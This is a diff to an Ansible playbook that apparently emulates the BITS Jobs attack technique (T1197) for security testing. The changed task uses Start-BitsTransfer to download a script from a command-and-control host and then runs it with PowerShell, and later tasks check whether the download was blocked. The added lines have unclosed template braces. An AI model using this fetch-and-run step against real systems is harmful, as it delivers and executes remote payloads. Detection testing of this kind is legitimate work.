@@ -4,21 +4,18 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-          - name: Download payload
+          - name: Download payload CMD
           # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
-            tags: always
-            #become: yes
-            become_user: SYSTEM
-            win_shell: |
-              whoami > c:\temp\whoami.txt
-              Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\TEMP\bitsadmin_flag.ps1
+            tags: CMD
+            win_command: |
+              Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination %TEMP%\{{ exfil_script_windows }&powershell {{ exfil_script_windows }
           - name: sleep for 10 seconds and continue with play if download was blocked or not
             tags: always
             wait_for: timeout=10
             delegate_to: localhost
           - name: Check Payload downloaded
             tags: always
-            win_command: type %TEMP%\bitsadmin_flag.ps1
+            win_command: type %TEMP%\{{ exfil_script_windows }
             register: T1197
           - name: check if playbook was successfull
             tags: always
